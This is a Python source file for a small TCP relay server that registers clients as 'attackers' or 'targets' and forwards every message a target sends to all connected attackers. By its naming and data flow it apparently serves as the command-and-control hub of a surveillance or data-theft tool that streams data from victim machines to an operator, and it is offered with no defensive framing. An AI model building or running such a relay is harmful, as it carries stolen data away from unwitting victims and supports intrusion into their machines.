import socket
import threading
import struct


ATTACKER_LIST = []
TARGET_LIST = []
ATTACKER_TO_TARGET = {}
TARGET_TO_ATTACKETS = {}


class Server():
    def __init__(self):
        self.server_socket = socket.socket()
        self.server_socket.bind(("0.0.0.0", 8000))
        self.server_socket.listen(100)
        print("Listening for clients...")

        while True:
            client, address = self.server_socket.accept()
            threading.Thread(target=self.play_client,
                             args=(client,)).start()

    def play_client(self, client):
        self.client = client
        Main(self.client)


class Main():
    def __init__(self, client):
        self.client = client
        try:
            data = (SuperSocket(self.client).recv_msg()).decode()
            if data == "1":
                ATTACKER_LIST.append(self.client)
            else:
                TARGET_LIST.append(self.client)
            print("TARGETS:")
            print(TARGET_LIST)
            print("ATTACKERS:")
            print(ATTACKER_LIST)
            print("----------------------------------------------------------")
            self.operations()
        finally:
            if self.client in TARGET_LIST:
                TARGET_LIST.remove(self.client)
                print("closed")
            else:
                ATTACKER_LIST.remove(self.client)
                print("closed attacker")
            self.client.close()

    def operations(self):
        while True:

            data = SuperSocket(self.client).recv_msg()
            try:
                if self.client in TARGET_LIST:
                    for socket in ATTACKER_LIST:
                        SuperSocket(socket).send_msg(data)
                else:
                    pass
            except:
                pass


class SuperSocket():
    def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
        self.current_socket = current_socket

    # create a pack with length of message and message and sending this pack to server
    def send_msg(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.current_socket.send(msg)

    def recv_msg(self):  # getting the message and understading what is the length of the message and return the the message
        raw_msglen = self.recvall(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, msglen):  # getting the whole message and returning the data to the recv_msg
        data = b''
        while len(data) < msglen:
            packet = self.current_socket.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == '__main__':
    Server()
